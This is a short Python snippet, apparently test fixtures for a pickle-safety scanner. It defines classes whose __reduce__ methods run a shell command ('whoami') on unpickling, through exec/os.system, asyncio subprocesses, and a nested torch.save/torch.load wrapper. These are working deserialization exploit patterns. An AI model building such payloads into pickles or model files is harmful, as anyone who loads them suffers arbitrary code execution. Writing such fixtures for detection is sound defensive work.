class BadInnerPickle:
    def __reduce__(self):
        cse = asyncio.create_subprocess_shell
        return cse, ('whoami',)

class BadOuterPickle:
    def __reduce__(self):
        return asyncio.run, (BadInnerPickle(),)

class BadPickle:
    def __reduce__(self):
        cmd = 'import os; os.system("whoami")'
        return exec, (cmd,)

class TorchedPickle:
    def __reduce__(self):
        import io
        badpicklebytes = io.BytesIO()
        torch.save(BadPickle(), badpicklebytes)
        badpicklebytes.seek(0)
        return torch.load, (badpicklebytes,)
